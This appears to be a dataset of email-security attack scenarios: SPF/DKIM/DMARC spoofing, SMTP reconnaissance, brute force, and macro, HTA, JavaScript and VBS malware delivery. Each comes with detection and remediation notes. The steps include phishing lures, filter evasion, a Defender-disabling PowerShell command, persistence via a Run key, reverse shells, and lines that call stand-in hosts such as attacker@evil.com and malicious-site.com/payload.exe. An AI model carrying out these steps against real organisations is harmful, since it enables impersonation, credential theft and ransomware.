Title: Misconfigured SPF Record Bypass
Scenario Description: Attacker sends spoofed emails that pass SPF due to an overly permissive record
Attack Steps: Step 1: Use dig TXT domain.com to view the SPF record. Step 2: Look for v=spf1 +all or includes like include:someuntrusted.com. Step 3: Use sendmail or online spoofing tools to craft a spoofed email as admin@domain.com from attacker IP. Step 4: Send spoofed email to a test recipient. Step 5: Use EmailHeaderAnalyzer to confirm SPF passed due to misconfig. Step 6: Demonstrate how an attacker can impersonate internal users.
Detection Method: Analyze SPF records and email headers
Solution: Use -all in SPF, avoid +all, audit includes

Title: Missing DKIM Signing
Scenario Description: Attacker forges email headers due to absence of DKIM signature verification
Attack Steps: Step 1: Use dig TXT default._domainkey.domain.com to check if DKIM is enabled. Step 2: If no DKIM record, craft email with forged headers using sendmail. Step 3: Send the email with manipulated From, Reply-To, and Subject headers. Step 4: Receive the email and verify it arrived without DKIM failure warning. Step 5: Analyze how forged email appears legitimate in inbox. Step 6: Show how attackers exploit this for BEC or phishing.
Detection Method: Use DKIM validators on incoming email
Solution: Enable and enforce DKIM on outbound emails

Title: Weak DMARC Policy
Scenario Description: Attacker abuses p=none DMARC to bypass email protection checks
Attack Steps: Step 1: Use dig TXT _dmarc.domain.com to retrieve the DMARC record. Step 2: Confirm the policy is p=none, meaning no enforcement. Step 3: Use spoofemail.io or sendmail to spoof an internal address. Step 4: Send spoofed email to a test recipient. Step 5: Check that spoofed email arrives without warning. Step 6: Demonstrate how attacker can use this for phishing or fraud.
Detection Method: DMARC aggregate reports, spoof tests
Solution: Use p=quarantine or p=reject in DMARC

Title: Excessive SMTP Banner Info Leak
Scenario Description: Attacker collects software version and internal hostname via SMTP banner
Attack Steps: Step 1: Use nc targetdomain.com 25 or telnet to connect to SMTP port. Step 2: Read the server banner, e.g., 220 mail.domain.com ESMTP Postfix 3.1.2. Step 3: Note hostname, software, and version info. Step 4: Use version info in CVE databases to identify known exploits. Step 5: Document how misconfigured banners help attackers with reconnaissance. Step 6: Simulate scanning multiple email servers to demonstrate scale.
Detection Method: Monitor SMTP logs and disable banner
Solution: Customize SMTP banner, hide version info

Title: IMAP Without TLS
Scenario Description: Attacker intercepts email credentials by capturing IMAP traffic sent without TLS
Attack Steps: Step 1: Set up a MITM proxy or tap the network using Bettercap. Step 2: Wait for an email client to connect to port 143 (IMAP). Step 3: If TLS is not enforced, capture plaintext username and password. Step 4: Use Wireshark to extract login credentials. Step 5: Replay captured credentials to access the mailbox. Step 6: Show email contents were exposed due to lack of encryption.
Detection Method: Monitor network for unencrypted IMAP logins
Solution: Enforce IMAPS (port 993), disable plaintext IMAP

Title: Public Webmail Admin Panel
Scenario Description: Admin panel for webmail (e.g., Roundcube, Zimbra) is exposed to internet without MFA or IP restriction
Attack Steps: Step 1: Scan domain using WhatWeb or Wappalyzer to detect webmail platform. Step 2: Locate panel like webmail.domain.com/admin or zimbra.domain.com:7071. Step 3: Attempt brute-force login using Hydra with common username/password list. Step 4: On successful login, gain full access to mailboxes and config. Step 5: Demonstrate how lack of MFA/IP whitelisting leads to takeover. Step 6: Explain risks of hosting admin panel publicly without protection.
Vulnerability: Public admin access with weak auth
Detection Method: Brute-force detection, login audit logs
Solution: Restrict by IP, enforce MFA, CAPTCHA
Tags: webmail, zimbra, admin portal, weak auth

Title: Misconfigured Catch-All Account
Scenario Description: A catch-all email is configured, allowing attackers to receive emails meant for mistyped or non-existent accounts
Tools Used: Mail server admin panel, Telnet, Test email client
Attack Steps: Step 1: Identify that the mail server has a "catch-all" address, which means emails to any mistyped username still go to a default inbox (e.g., admin@domain.com).Step 2: Register or gain access to this catch-all inbox (if open relay is available or weak auth exists).Step 3: Send test emails to fake users like ceo@domain.com, finance@domain.com, etc., and confirm they're delivered to the catch-all.Step 4: Wait and monitor for real emails sent to mistyped or guessed usernames.Step 5: Use gathered data (invoices, internal info) for phishing or further exploitation.
Detection Method: Analyze recipient logs; unusual recipient patterns
Solution: Disable catch-all or monitor mailbox strictly

Title: POP3 Enabled Without TLS
Scenario Description: The POP3 protocol is enabled without TLS, exposing credentials over the network
Attack Steps: Step 1: Use Wireshark to monitor traffic on the network (e.g., in a test LAN).Step 2: Configure a test email client to connect using POP3 (port 110) without encryption.Step 3: Log in with valid credentials on the client.Step 4: In Wireshark, observe that username and password are clearly visible in the traffic.Step 5: Replay the credentials using a script or POP3 client to confirm full inbox access.Step 6: Use this method to demonstrate how attackers on the same network could capture credentials.
Detection Method: Monitor traffic for unencrypted login attempts
Solution: Enforce POP3S or disable POP3 altogether

Title: Backup MX Server Exploitation
Scenario Description: The domain uses a backup mail server that lacks security protections
Attack Steps: Step 1: Use dig MX domain.com or MXToolbox to find all MX entries.Step 2: Note the backup MX (with higher priority number).Step 3: Connect to the backup MX using Telnet or SMTP testing tool.Step 4: Attempt to deliver email bypassing normal SPF/DKIM checks.Step 5: If backup MX accepts messages without proper filtering, attacker can deliver spam or phishing.Step 6: Confirm delivery via email logs or receiving account.
Detection Method: Audit logs of backup MX for odd deliveries
Solution: Secure all MX servers equally

Title: Autoresponder Information Leak
Scenario Description: Misconfigured autoresponder reveals sensitive details (employee absence, internal structure)
Attack Steps: Step 1: Send a blank or test email to hr@domain.com, ceo@domain.com, or other corporate addresses.Step 2: Observe autoresponse: e.g., "John is on leave till Aug 5, contact jane@domain.com instead."Step 3: Collect this auto-response for reconnaissance.Step 4: Use internal contact names for further phishing or impersonation attacks.Step 5: Repeat across multiple users to gather more org structure.
Detection Method: Monitor outbound auto-replies
Solution: Keep auto-replies generic or internal only

Title: SMTP VRFY with Internal Relay Discovery
Scenario Description: Attacker uses VRFY and EXPN to map internal mail groups and forwards
Attack Steps: Step 1: Connect to target SMTP via telnet domain.com 25.Step 2: Type HELO attacker.com.Step 3: Send commands like EXPN staff, EXPN marketing, etc.Step 4: Server reveals full internal distribution list.Step 5: Use this list to craft precise phishing campaigns.Step 6: Demonstrate that legacy configurations may still have these commands enabled.
Detection Method: Monitor SMTP commands usage
Solution: Disable VRFY and EXPN in mail config

Title: SPF Bypass via Third-Party Include
Scenario Description: A third-party include in SPF record is exploited because it accepts spoofed IPs
Tools Used: dig, Email Spoofer, DNS Lookup Tool
Attack Steps: Step 1: Use dig TXT domain.com and look for include:unsecure3rdparty.com.Step 2: Check that the included domain has +all or loose IP validation.Step 3: Use spoofing tools to send email from attacker@domain.com using spoofed IP.Step 4: Email gets SPF PASS due to the included record.Step 5: Use this to demonstrate how trusting 3rd-party SPF records can backfire.
Detection Method: Analyze full SPF tree
Solution: Audit third-party includes, enforce -all

Title: Unauthenticated Email Forwarding Rule
Scenario Description: Attacker configures auto-forward rule to exfiltrate emails without authentication
Attack Steps: Step 1: Gain access to webmail client (test or demo user).Step 2: Create a forwarding rule to send all incoming mail to attacker@evil.com.Step 3: In test environment, send email to the compromised account.Step 4: Confirm it auto-forwards to attacker address without alerts.Step 5: Demonstrate how unattended mailbox can silently leak data.
Detection Method: Log forwarding rules & alert on new entries
Solution: Alert when external forwards are set

Title: SMTP AUTH Using Weak Passwords
Scenario Description: Mail server allows weak passwords for SMTP AUTH login
Attack Steps: Step 1: Use Hydra to brute-force the SMTP login with usernames like user@domain.com and a list of common passwords.Step 2: Attempt login on port 587 (SMTP AUTH).Step 3: If weak credentials accepted, gain full send access.Step 4: Send phishing/spam using legitimate identity.Step 5: Demonstrate how this leads to abuse of infrastructure.
Detection Method: Monitor auth failures and password strength
Solution: Enforce password complexity, lockout policy

Title: No Rate Limiting on Login Attempts
Scenario Description: SMTP/IMAP services do not restrict repeated failed logins, allowing brute-force attacks
Tools Used: Hydra, Burp Suite, Test Mail Server
Attack Steps: Step 1: Identify login endpoint (SMTP, IMAP, webmail).Step 2: Use Hydra or a script to send 1000 login attempts rapidly.Step 3: Note there are no CAPTCHAs or lockouts.Step 4: On success, demonstrate inbox access or ability to send as user.Step 5: Simulate and log rate of attempts and time taken to breach.
Detection Method: Alert on repeated login failures
Solution: Add rate limits, MFA, CAPTCHA

Title: Misconfigured Email Logs Expose PII
Scenario Description: Logging settings include full email contents, exposing PII in log files
Tools Used: Mail Log Viewer, grep, Email Server Settings
Attack Steps: Step 1: Access email server logs (simulated/test system).Step 2: Search logs for keywords like "SSN", "invoice", "password".Step 3: Note that full email body and subject lines are stored in plaintext logs.Step 4: Demonstrate how an insider or attacker can read sensitive data.Step 5: Highlight importance of masking or disabling sensitive logging.
Detection Method: Audit logs for sensitive content
Solution: Redact or mask logs, limit logging verbosity

Title: Malicious Invoice Macro Attack
Scenario Description: An attacker sends a fake invoice to the finance department of a company. The Word document contains a hidden macro that downloads malware from the internet.
Attack Steps: Step 1: Attacker creates a fake invoice using Microsoft Word and enables macro content.Step 2: Attacker writes a malicious VBA macro that uses PowerShell or mshta.exe to connect to a remote server and download a payload (e.g., keylogger or RAT).Step 3: Macro is embedded and saved in the .docm file.Step 4: Attacker crafts a convincing phishing email (e.g., "Urgent invoice due!") and attaches the file.Step 5: Victim opens the document and clicks "Enable Content" to view it.Step 6: Macro executes silently in the background and downloads the malware to the victim's PC.Step 7: Malware installs itself in a hidden directory and starts logging keystrokes.Step 8: Data is exfiltrated via email or a command & control server.
Detection Method: Endpoint behavior monitoring, alert on unexpected use of mshta.exe
Solution: Disable macros via GPO, train employees to avoid "Enable Content"

Title: Resume with Embedded Macro RAT
Scenario Description: A fake job applicant sends their resume with embedded macro malware to HR personnel to install a Remote Access Trojan (RAT).
Attack Steps: Step 1: Attacker creates a fake resume in Word with an embedded malicious macro.Step 2: The macro contains obfuscated PowerShell code generated via Empire.Step 3: Attacker sends the resume as part of a convincing job application email to HR.Step 4: HR personnel opens the document and clicks "Enable Content".Step 5: The macro runs silently and establishes a connection to the attacker’s Empire listener.Step 6: The attacker gains full remote access to the system.Step 7: Attacker explores the HR system, attempts lateral movement.Step 8: Sensitive files (employee data, salary slips) are exfiltrated.
Detection Method: Unusual network connections, child process creation by Word
Solution: Disable macros by default, sandbox email attachments

Title: Excel Macro for Credential Harvesting
Scenario Description: A fake report in Excel contains a macro that prompts for credentials using a fake login form and sends them to an attacker.
Attack Steps: Step 1: Attacker prepares an Excel file labeled "Monthly Team Bonus.xlsx".Step 2: A VBA macro is added that triggers a fake login prompt when opened.Step 3: The macro captures user credentials and sends them to a remote SMTP server.Step 4: Email is sent to employees, especially finance or management team, with a message like "Review your bonus details".Step 5: Victim opens the file, sees the login form, and enters credentials.Step 6: Credentials are exfiltrated to the attacker’s email.Step 7: Attacker uses credentials for internal access or lateral movement.Step 8: Further malicious payloads may be dropped if persistence is desired.
Detection Method: Monitor for VBA form creation, alert on SMTP traffic from Excel
Solution: Train users to never input login details in Office files

Title: Macro-Driven Ransomware Deployment
Scenario Description: An attacker delivers ransomware via a macro-enabled Word document disguised as a legal document, encrypting all user files.
Attack Steps: Step 1: Attacker creates a Word doc named "Contract_Agreement.docm".Step 2: A macro is embedded that executes a PowerShell script for downloading ransomware.Step 3: Script is obfuscated to evade detection (e.g., Base64 encoded).Step 4: Email is sent to legal or management personnel with a subject "Final Agreement for Review".Step 5: User opens the file and enables content.Step 6: Macro runs the PowerShell script which downloads and executes the ransomware.Step 7: Ransomware encrypts all user files and leaves a ransom note on the desktop.Step 8: User is locked out of files; attacker demands payment via cryptocurrency.
Detection Method: Monitor for encryption activity, block script execution from Word
Solution: Use application whitelisting, disable macros, backup data

Title: Fake Meeting Agenda with Macro Downloader
Scenario Description: A fake meeting agenda is sent to team leads. When opened, a macro downloads a backdoor and installs it silently.
Attack Steps: Step 1: Attacker drafts a fake “Team Meeting Agenda.docm” document.Step 2: The macro uses PowerShell to download a remote access shell (reverse shell).Step 3: Email is crafted as if sent by a manager, with a message like "Please review this agenda before tomorrow's meeting."Step 4: Victim opens the document and clicks “Enable Content.”Step 5: Macro runs PowerShell to connect to attacker's server using Netcat.Step 6: A reverse shell opens, giving attacker full control.Step 7: Attacker silently explores files and installs persistence.Step 8: Victim remains unaware while data is being collected.
Detection Method: Monitor for child processes from Office apps
Solution: Use Office Protected View, restrict internet access to macros

Title: Macro Malware via Monthly Report
Scenario Description: Monthly report Excel sheet contains a macro that disables security tools and opens a backdoor.
Attack Steps: Step 1: Attacker prepares “Monthly_Finance_Report.xlsm” with a hidden macro.Step 2: Macro disables Defender using PowerShell: Set-MpPreference -DisableRealtimeMonitoring $true.Step 3: It then downloads a backdoor binary.Step 4: The email says, “Please verify the numbers by EOD.”Step 5: Victim opens the Excel file and enables macros.Step 6: Macro disables antivirus and installs the payload.Step 7: Attacker schedules persistence using Windows Task Scheduler.Step 8: Attacker can access the system at will for further exploitation.
Detection Method: Alert on security tool changes, PowerShell logging
Solution: Block macro download activity via proxy/DNS
Tags: defender bypass, task scheduler, xlsm, persistence

Title: PDF Attachment with Embedded Office Macro
Scenario Description: A PDF lure contains a hidden Office document embedded inside, which runs macro when opened.
Attack Steps: Step 1: Attacker creates a fake PDF titled “Company_Policy_Update.pdf”.Step 2: PDF contains an embedded macro-enabled Word file.Step 3: Email says “Important: Open Attached Policy Document Immediately”.Step 4: When victim opens the PDF, it prompts to open the embedded file.Step 5: Word opens, and user clicks “Enable Content”.Step 6: Macro executes and uses PowerShell to connect to attacker’s server.Step 7: Payload is downloaded and installed silently.Step 8: Attacker uses access to monitor system activity.
Detection Method: Alert on embedded documents, analyze outbound connections
Solution: Train users not to open nested files

Title: Supply Chain Targeted Macro Attack
Scenario Description: Attacker targets vendor employees by pretending to be from the parent company requesting invoice reconciliation.
Attack Steps: Step 1: Attacker builds a fake invoice with macros using company branding.Step 2: Macro runs a Metasploit payload that opens a session.Step 3: Attacker sends email appearing from procurement@company.com.Step 4: Victim at vendor side opens the document.Step 5: Clicking “Enable Content” triggers the macro.Step 6: A Meterpreter session is opened back to the attacker.Step 7: Attacker navigates through vendor’s internal network.Step 8: Intellectual property or credentials are exfiltrated.
Detection Method: Monitor outbound sessions from non-core endpoints
Solution: Verify sender identities, isolate vendor communications

Title: Encrypted Email with Macro Attachment
Scenario Description: Attacker sends a password-protected zip file containing a macro-infected document to bypass filters.
Attack Steps: Step 1: Attacker creates a Word file with macro malware.Step 2: The file is compressed in a password-protected ZIP file.Step 3: Attacker emails the victim: “Please find the confidential agreement attached. Password: 1234”.Step 4: User extracts the zip file and opens the document.Step 5: Clicking “Enable Content” runs the macro.Step 6: Macro installs spyware or screen capture tool.Step 7: All screenshots are sent to attacker periodically.Step 8: Attacker monitors everything the victim sees on screen.
Detection Method: Detect unusual outbound traffic or screen capture utilities
Solution: Block unknown ZIPs, filter for password sharing in email body

Title: Macro Executes WMI for Remote Lateral Access
Scenario Description: A macro uses WMI to perform lateral movement to another device in the same network.
Attack Steps: Step 1: Attacker crafts “Compliance_Notice.docm” with a macro.Step 2: Macro runs PowerShell that uses WMI to scan local network.Step 3: Based on open ports or shared folders, attacker uses WMI to drop malware on another host.Step 4: Email is sent to the IT team or compliance group.Step 5: When victim opens the file and enables content, macro executes.Step 6: Remote WMI command copies the payload to a shared folder.Step 7: PsExec is triggered remotely to execute it.Step 8: Malware spreads laterally to multiple systems.
Detection Method: Detect WMI activity from Office processes, scan network shares
Solution: Limit WMI access, use segmentation in internal networks

Title: Fake Security Update Document
Scenario Description: An attacker sends a fake IT notice to employees stating that a critical security update must be reviewed. The attached Word document installs a keylogger when the macro runs.
Tools Used: Word, VBA, PowerShell, Custom Keylogger Script
Attack Steps: Step 1: Attacker creates a document named “Security_Update_Notice.docm”.Step 2: The macro contains VBA code that executes PowerShell to download a lightweight keylogger.Step 3: Attacker hosts the keylogger script on a private server.Step 4: A phishing email is crafted to impersonate internal IT (e.g., “it-support@company.com”).Step 5: The email instructs the user to open the attached policy update.Step 6: Victim opens the document and clicks “Enable Content” to read the fake notice.Step 7: The macro silently downloads the keylogger and places it in a hidden system folder.Step 8: The keylogger starts capturing everything the user types (passwords, chats, emails).Step 9: It periodically sends logs to the attacker’s email or server.Step 10: Attacker gains access to credentials for internal systems.
Detection Method: Detect hidden processes, monitor traffic to unknown endpoints
Solution: Disable macros, train users on internal comms policy

Title: Macro-Triggered Browser Exploit
Scenario Description: A macro in a Word document opens a hidden browser session to exploit an outdated browser plugin.
Tools Used: Word, VBA, Internet Explorer, Java Exploit Kit
Attack Steps: Step 1: Attacker creates a document with an embedded macro titled “Important_Tax_Notice.docm”.Step 2: Macro launches a hidden instance of Internet Explorer via CreateObject("InternetExplorer.Application").Step 3: The macro auto-navigates to a malicious website controlled by the attacker.Step 4: That site hosts an exploit targeting an outdated Java plugin installed in Internet Explorer.Step 5: If vulnerable, a malware payload (e.g., spyware or ransomware) is installed.Step 6: The user may see a flash of activity or nothing at all.Step 7: The macro closes IE after successful payload delivery.Step 8: Attacker receives beacon from infected machine and begins command & control.
Detection Method: Alert on legacy browser usage or known exploit sites
Solution: Disable older plugins, patch browsers, segment macro-capable apps
Tags: ie, macro, browser exploit, tax notice

Title: Macro Steals Clipboard Data
Scenario Description: Macro steals sensitive clipboard content (e.g., passwords or copied emails) and exfiltrates it silently.
Attack Steps: Step 1: Attacker creates a Word file called “Staff_Reorganization_Plan.docm”.Step 2: Embedded macro is designed to run on open and monitor clipboard activity.Step 3: Whenever a user copies content (like a password or an email), the macro stores it.Step 4: Macro then sends clipboard data via SMTP or HTTP POST to attacker’s server.Step 5: Attacker targets departments known to copy-paste credentials often (e.g., Help Desk).Step 6: Email is phrased urgently — “Please review staff changes before Monday.”Step 7: User opens file and enables macros.Step 8: Clipboard is continuously monitored and data is silently stolen.Step 9: Attacker collects credentials or sensitive discussions.Step 10: Access is used to impersonate or escalate privileges internally.
Detection Method: Monitor clipboard access APIs, inspect SMTP data
Solution: Disable macros, DLP solutions to monitor sensitive copy-paste

Title: Fake Bank Statement with Persistence Installer
Scenario Description: Fake bank statement attachment executes a macro that adds a persistent malware to startup folders.
Attack Steps: Step 1: Attacker generates “Bank_Statement_June.docm” with a macro.Step 2: Macro downloads a malicious .exe disguised as a PDF helper tool.Step 3: It adds a registry key in HKCU\Software\Microsoft\Windows\CurrentVersion\Run.Step 4: The email is made to appear from a trusted bank contact.Step 5: User opens the document and clicks “Enable Content”.Step 6: The macro installs the malware and ensures it runs every time the system starts.Step 7: Attacker gets long-term access to the user’s system.Step 8: From there, attacker explores files, captures screenshots, and exfiltrates them daily.Step 9: User is unaware because the malware has no visible interface.Step 10: Attacker uses persistence to deploy further payloads.
Detection Method: Monitor registry changes, alert on new autoruns
Solution: Endpoint protection, application whitelisting

Title: Macro Opens Command Prompt Backdoor
Scenario Description: A document runs a macro that opens a hidden Command Prompt and sets up a reverse shell.
Attack Steps: Step 1: Attacker creates “Policy_Document_Update.docm”.Step 2: Macro runs hidden Command Prompt using VBA Shell method.Step 3: The command executed is a reverse shell connection via Netcat (nc.exe).Step 4: File is sent via phishing email to government employees.Step 5: Victim opens file, clicks “Enable Content”, unaware of background execution.Step 6: A hidden command prompt connects to attacker’s IP.Step 7: Attacker gains shell access and browses internal network.Step 8: Commands can be issued like file copy, netstat, tasklist, etc.Step 9: Attacker maintains the session until machine reboots.Step 10: System is at high risk until detection or reset.
Detection Method: Detect use of nc.exe or PowerShell from Office
Solution: Disable macros, log shell executions

Title: Macro Keylogger via Hidden Task Scheduler
Scenario Description: A macro schedules a task in Windows that periodically launches a keylogger executable.
Attack Steps: Step 1: Attacker creates a Word doc titled “Job_Offer_Contract.docm”.Step 2: Macro uses schtasks to schedule a job that runs keylogger.exe daily at login.Step 3: Keylogger binary is downloaded during macro execution.Step 4: Email looks like a real job offer with salary details to lure the victim.Step 5: Victim opens file and enables content.Step 6: Macro runs silently, creates scheduled task in background.Step 7: Every login, the keylogger runs and records everything typed.Step 8: Logs are saved in a hidden folder or exfiltrated via email.Step 9: Attacker collects passwords and sensitive info.Step 10: Even if user closes Word, malware persists.
Detection Method: Audit task scheduler creation, detect hidden tasks
Solution: Block scheduled task creation from Word macros

Title: Macro Initiates Fake Windows Update
Scenario Description: Macro creates a fake Windows Update screen and encrypts files in the background.
Attack Steps: Step 1: Word file “Quarterly_Review_Metrics.docm” includes a macro.Step 2: Macro downloads a full-screen fake “Windows Update in progress…” message.Step 3: While this screen is displayed, the macro uses PowerShell to encrypt files.Step 4: Victim opens file and enables content, believing it to be a real update.Step 5: User sees the fake update screen and waits.Step 6: In the background, PowerShell encrypts user documents, spreadsheets, and images.Step 7: Once completed, screen disappears and ransom note appears.Step 8: Attacker demands payment to decrypt files.Step 9: System is non-functional until restored or decrypted.Step 10: Files may be permanently lost if ransom not paid.
Detection Method: Monitor PowerShell with GUI scripts, detect full-screen hijack
Solution: Backup critical data, never trust unexpected update prompts

Title: Macro Downloads and Runs Obfuscated Script
Scenario Description: The macro downloads a Base64-encoded script, decodes it, and runs it via PowerShell to avoid detection.
Attack Steps: Step 1: Attacker creates “Employee_Referral_Form.docm” with macro.Step 2: Macro fetches a Base64-encoded payload from a remote server.Step 3: PowerShell decodes the string into a full malware script.Step 4: The decoded script is executed in memory (no disk write).Step 5: Email sent with subject: “Refer and earn - HR Form Attached”.Step 6: Victim enables macros, script runs.Step 7: Malware silently runs in RAM, making detection harder.Step 8: Malware can steal cookies, tokens, session info.Step 9: Attacker captures browser data.Step 10: Malware disappears after reboot unless persistence is added.
Detection Method: Monitor decoding activity, PowerShell without file creation
Solution: Use EDR tools that inspect memory operations

Title: Macro Uses OneNote as Payload Dropper
Scenario Description: Macro opens OneNote in the background and inserts a malicious .exe disguised as a note.
Attack Steps: Step 1: Word document titled “Annual_KPI_Targets.docm” is created.Step 2: Macro opens OneNote and creates a new note.Step 3: The note includes a hidden .exe payload attached and embedded in a visual element.Step 4: User is told to check the "new shared note" in email.Step 5: Victim opens Word file, macro creates and opens the OneNote silently.Step 6: User double-clicks the embedded file believing it’s part of the note.Step 7: .exe runs and gives attacker control.Step 8: Malware uses persistence to stay even after reboot.Step 9: Attacker controls infected machine.Step 10: OneNote is used as a sneaky vector, bypassing many filters.
Detection Method: Monitor for unusual OneNote activity, review embedded content
Solution: Block script access to Office inter-process APIs

Title: Macro Launches Hidden Browser for Phishing Session
Scenario Description: A macro in a document silently opens a hidden browser window to a phishing page that looks like the company’s login portal. It pre-fills the user’s email and tricks them into entering their password.
Tools Used: Word, VBA, Internet Explorer COM, Phishing Page, JavaScript Keylogger
Attack Steps: Step 1: Attacker crafts a Word document titled “Q3_Performance_Review.docm”.Step 2: Macro uses the InternetExplorer.Application COM object to launch Internet Explorer in the background.Step 3: Macro navigates to a fake login page hosted on the attacker’s phishing server (e.g., portal-review-support[.]com).Step 4: The page looks identical to the real company login screen.Step 5: Macro retrieves the current user’s email from the registry or system variables and appends it in the login form automatically.Step 6: The macro then uses IE.Visible = True to suddenly bring the fake login window to the front as if the document needs verification.Step 7: The victim sees what appears to be the company’s login prompt and enters their password.Step 8: JavaScript on the page captures the credentials and sends them to the attacker in real time.Step 9: The macro closes the browser and returns to the document, making it seem like nothing happened.Step 10: Attacker immediately logs into corporate services using the stolen credentials.
Detection Method: Monitor for Word spawning browser processes, phishing URL DNS calls
Solution: Use browser isolation, disable macro access to COM objects
Tags: phishing, macro, IE COM, fake login, credential theft

Title: HTA Payload in ZIP Attachment
Scenario Description: Attacker sends an HTA file compressed inside a ZIP to bypass email filters. On extracting and executing, it runs PowerShell commands to connect to C2 server.
Attack Steps: Step 1: Create HTA payload using Metasploit or manual mshta script.Step 2: Compress the .hta file into a .zip to bypass detection.Step 3: Compose a phishing email pretending to be from HR (e.g., "Updated Policy").Step 4: Attach ZIP and send it to target.Step 5: Victim opens the ZIP and double-clicks HTA file.Step 6: HTA runs hidden PowerShell, connects to attacker’s C2.Step 7: Attacker gets remote access.
Vulnerability: Poor email filtering, lack of HTA blocking
Detection Method: Email gateway logs, EDR for mshta.exe spawning PowerShell
Solution: Block .hta execution via GPO, ZIP scanning, user training

Title: JavaScript Resume Dropper
Scenario Description: Attacker sends a fake job application with a malicious .js file named "Resume.js". If executed, it downloads and runs malware.
Attack Steps: Step 1: Write a JavaScript file that downloads an EXE using certutil.Step 2: Rename it to something appealing like "Resume.js".Step 3: Craft an email pretending to be a job applicant.Step 4: Attach "Resume.js" and send to HR email.Step 5: HR opens the file out of curiosity.Step 6: JavaScript triggers and downloads EXE silently.Step 7: Malware executes and gives attacker control.
Vulnerability: No attachment file-type control, script execution allowed
Detection Method: AV alerts, PowerShell logs, web proxy logs
Solution: Block script extensions, restrict certutil, educate HR

Title: VBS Invoice Malware
Scenario Description: Attacker sends a fake invoice named "Invoice.vbs". When executed, it steals saved browser passwords and sends them to an email.
Attack Steps: Step 1: Write VBS script that reads stored passwords and emails them via SMTP.Step 2: Name file “Invoice.vbs” and attach to email.Step 3: Pretend to be vendor emailing overdue invoice.Step 4: Victim opens the file in Windows by double-click.Step 5: Script executes silently in background.Step 6: Passwords exfiltrated to attacker’s email.Step 7: Attacker gains credential access.
Vulnerability: Email allows VBS files, WScript enabled
Detection Method: Email logs, unusual SMTP traffic
Solution: Block VBS via mail filters, disable WScript

Title: HTA Malware via Cloud Link
Scenario Description: A disguised cloud storage link leads to a hosted HTA file. Email uses urgency to lure the user into clicking and executing it.
Attack Steps: Step 1: Upload malicious .hta file to Google Drive.Step 2: Shorten the link with bit.ly or similar.Step 3: Compose phishing email (e.g., “Urgent Account Update Required”).Step 4: Insert shortened link into the email.Step 5: Victim clicks the link and downloads HTA.Step 6: User runs the HTA file.Step 7: HTA runs PowerShell to install malware.
Vulnerability: Trust in cloud links, mshta.exe not restricted
Detection Method: Proxy logs, EDR alert on mshta
Solution: Block mshta, disable cloud link access to HTA
Tags: HTA, Cloud Delivery, Bitly, Social Engineering

Title: JavaScript Downloader in HTML Email
Scenario Description: The attacker embeds a JavaScript payload inside an HTML email. On opening, script tries to load malware from remote server.
Tools Used: HTML email, JS tag, C2 server
Attack Steps: Step 1: Create HTML email with that loads remote JS.Step 2: Host JavaScript malware on attacker server.Step 3: Embed script in HTML email pretending to be newsletter.Step 4: Victim opens email; JS triggers auto-download.Step 5: Browser/Outlook renders email, executes embedded JS.Step 6: Malware downloaded and possibly executed.Step 7: Backdoor or keylogger gets installed.
Vulnerability: Email client renders JS, no script filtering
Detection Method: Web gateway logs, JS analysis in email content
Solution: Block JS rendering in email clients

Title: VBS-based Keylogger via Email
Scenario Description: Attacker delivers a VBS file disguised as a secure login tool. When executed, it installs a keylogger and sends keystrokes to the attacker.
Tools Used: Custom VBS script, SMTP CDO, Task Scheduler
Attack Steps: Step 1: Attacker writes a VBS script that logs keystrokes using WScript.CreateObject("Scripting.FileSystemObject").Step 2: Adds code to email logs daily via SMTP using CDO.Message.Step 3: Attaches VBS in email as “Security_Login_Tool.vbs”.Step 4: Sends it as a fake IT security update mail.Step 5: Victim runs it thinking it’s required.Step 6: Script installs keylogger and schedules it via Task Scheduler.Step 7: Logs are emailed daily to attacker.
Vulnerability: Scripting engines enabled, no attachment filtering
Detection Method: EDR monitoring script execution, strange email traffic
Solution: Disable VBS, email content inspection

Title: Embedded JS Downloader in PDF
Scenario Description: PDF contains embedded JavaScript that launches an external URL to download malware silently. Email tricks victim into opening the PDF.
Tools Used: PDF toolkit, Obfuscated JS, Malicious server
Attack Steps: Step 1: Attacker creates a PDF using tools like PDF Toolkit or MS Word export.Step 2: Embeds JavaScript that runs app.launchURL("http://malicious-site.com/payload.exe").Step 3: Crafts a phishing email: “Download your salary slip”.Step 4: Victim opens the PDF attachment.Step 5: JS triggers automatically in vulnerable PDF readers.Step 6: External executable is downloaded and saved.Step 7: Victim unknowingly executes downloaded file.
Vulnerability: PDF JS execution enabled, URL filters weak
Detection Method: Proxy logs, PDF sandboxing, AV alerts
Solution: Disable JS in PDF readers, isolate PDF opening

Title: Fake Chat Transcript HTA Dropper
Scenario Description: A fake support transcript (e.g., from “Tech Support”) is delivered via HTA file. Executing it deploys a backdoor and opens Notepad as a decoy.
Attack Steps: Step 1: HTA is crafted to execute PowerShell reverse shell using mshta.exe.Step 2: Script also opens Notepad to appear harmless.Step 3: Named “SupportChat.hta”, mimics support logs.Step 4: Email claims unresolved ticket with chat log.Step 5: Victim opens HTA, sees Notepad window.Step 6: Behind the scenes, shell connects to C2.Step 7: Attacker gets remote access to system.
Vulnerability: Trust in support files, no mshta control
Detection Method: EDR, netstat, PowerShell telemetry
Solution: Block mshta, restrict outbound PowerShell
Tags: HTA, Fake Support Chat, Decoy Execution

Title: Obfuscated JavaScript Order Form
Scenario Description: The attacker sends a .js file named as an “order form” but obfuscated using JS packers. It deploys malware silently.
Attack Steps: Step 1: Malicious JavaScript written to download a payload from a URL.Step 2: Code obfuscated using JS obfuscator (e.g., JavaScriptPacker).Step 3: File named “OrderDetails.js”.Step 4: Email fakes urgency: “Please process this order urgently”.Step 5: Victim runs the file assuming it opens order data.Step 6: Script triggers download and auto-executes malware.Step 7: Attacker gains initial access.
Detection Method: Static code analysis, proxy logs
Solution: Restrict script file types, user training

Title: HTA Script via Email Signature Link
Scenario Description: Malicious HTA file hosted online is linked inside a fake company signature. Victim clicks thinking it's a business profile.
Attack Steps: Step 1: Upload HTA to attacker’s server or cloud link.Step 2: Shorten link (e.g., bit.ly/manager-bio).Step 3: Add signature with link: “View Profile: bit.ly/manager-bio”.Step 4: Send email as if from external partner or CEO.Step 5: Victim clicks the signature link.Step 6: Downloads and opens HTA.Step 7: Executes code that connects to attacker.
Detection Method: Link monitoring, mshta.exe tracking
Solution: Disable HTA, alert on link shorteners

Title: Malicious Script in Self-Extracting Archive
Scenario Description: VBS script hidden inside a .exe self-extracting archive sent as an "installer" or "patch". Executing it drops and runs malware.
